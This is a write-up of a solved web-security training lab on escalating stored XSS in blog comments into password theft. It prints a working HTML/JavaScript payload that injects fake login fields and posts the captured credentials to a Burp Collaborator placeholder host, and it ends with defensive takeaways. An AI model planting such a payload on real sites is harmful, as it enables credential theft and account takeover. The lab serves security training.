# Cross-Site Scripting (XSS) – Exploiting XSS to Capture Passwords
(Web Security Academy)

This lab demonstrates how a **stored cross-site scripting (XSS)** vulnerability can be escalated into **credential harvesting**, allowing an attacker to steal a victim’s **username and password** and fully compromise their account.

---

## Lab: Exploiting Cross-Site Scripting to Capture Passwords

**Category:** Cross-site scripting  
**Type:** Stored XSS  
**Exploitation:** Credential harvesting  
**Level:** Practitioner  
**Status:** Solved  

---

## What This Lab Is About

This lab contains a **stored XSS vulnerability** in the blog comment functionality.

Key conditions:

- A simulated victim **automatically views all comments**
- Injected HTML and JavaScript execute in the victim’s browser
- The attacker can insert **fake login fields**
- Victim credentials can be exfiltrated using **Burp Collaborator**

The goal is to:

1. Capture the victim’s username and password
2. Retrieve the credentials from Burp Collaborator
3. Log in as the victim user
4. Solve the lab

---

## Attack Chain Overview

1. Inject stored XSS payload into a blog comment
2. Victim loads the comment
3. Fake username and password fields appear
4. Victim enters credentials
5. JavaScript sends credentials to attacker
6. Attacker logs in as the victim

---

## Vulnerable Flow

- **Source:** Blog comment input
- **Sink:** Stored HTML rendered to other users
- **Execution Context:** Victim’s browser
- **Sensitive Data:** Username and password

---

## Payload Used

```html
<input name="username" id="username">
<input type="password" name="password"
onchange="if(this.value.length)
fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
  method:'POST',
  mode:'no-cors',
  body:username.value+':'+this.value
});">
````

---

## Steps I Followed

1. Opened **Burp Suite Professional**
2. Navigated to the **Collaborator** tab
3. Clicked **Copy to clipboard** to generate a unique Collaborator payload
4. Posted the malicious payload as a blog comment
5. Waited for the simulated victim to view the comment
6. Returned to the Collaborator tab
7. Clicked **Poll now**
8. Observed an incoming HTTP POST request
9. Extracted the victim’s username and password from the request body
10. Logged out of my account
11. Logged in using the stolen credentials
12. Successfully accessed the victim’s account
13. Lab marked as solved

---

## Why This Worked

* Stored XSS executes automatically for all viewers
* HTML input fields can be injected via XSS
* JavaScript can capture user input events
* No input sanitization or output encoding was applied
* Burp Collaborator enables stealthy credential exfiltration

---

## Impact

* Credential theft
* Account takeover
* Privilege escalation
* Full user impersonation
* Loss of confidentiality and trust

---

## Key Lessons Learned

* Stored XSS can be used for phishing attacks
* XSS does not require stealing cookies to hijack accounts
* Fake login forms are extremely effective
* JavaScript event handlers can silently steal credentials
* Out-of-band exfiltration avoids visible indicators

---

## Defensive Takeaways

To prevent this attack:

* Sanitize and encode all user input
* Disallow HTML in user-generated content
* Use Content Security Policy (CSP)
* Avoid rendering raw user input
* Educate users about embedded login prompts

---

## Final Summary

* Stored XSS vulnerability in blog comments
* Fake credential fields injected via HTML
* Victim credentials captured using JavaScript
* Credentials exfiltrated via Burp Collaborator
* Successful login as the victim user
 
